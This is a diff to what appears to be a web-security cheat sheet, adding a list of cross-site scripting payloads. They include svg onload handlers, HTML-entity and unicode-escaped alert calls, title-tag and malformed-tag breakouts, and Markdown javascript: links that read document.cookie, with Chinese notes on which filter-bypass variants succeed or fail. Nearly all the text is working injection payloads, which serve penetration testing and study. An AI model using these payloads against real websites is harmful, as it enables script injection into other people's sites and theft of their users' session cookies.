@@ -2078,6 +2078,25 @@ xxe.dtd:
     - `alert.bind()(document.domain);`
     - https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309
 
+- Some Payload
+    - `<svg/onload=alert(1);alert(2)>`
+    - `<svg/onload="alert(1);alert(2)">`
+    - `<svg/onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;;alert(2)">`
+        - `;;`改成`;`會失敗
+        - 雙引號可去掉
+        - 可10進位, 16進位混合
+    - `<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>`
+        - \u形式只能用在javascript，例如onload的a改成\u0061會失敗
+    - `<title><a href="</title><svg/onload=alert(1)>`
+        - title優先權較大，直接中斷其他標籤
+    - `<svg><script>prompt&#40;1)</script>`
+        - 因為`<svg>`，HTML Entities會被解析
+        - 去掉`<svg>`會失敗，`<script>`不會解析Entities
+    - `<? foo="><script>alert(1)</script>">`
+    - `<! foo="><script>alert(1)</script>">`
+    - `</ foo="><script>alert(1)</script>">`
+    - `<% foo="><script>alert(1)</script>">`
+
 - Markdown XSS
     - `[a](javascript:prompt(document.cookie))`
     - `[a](j a v a s c r i p t:prompt(document.cookie))`
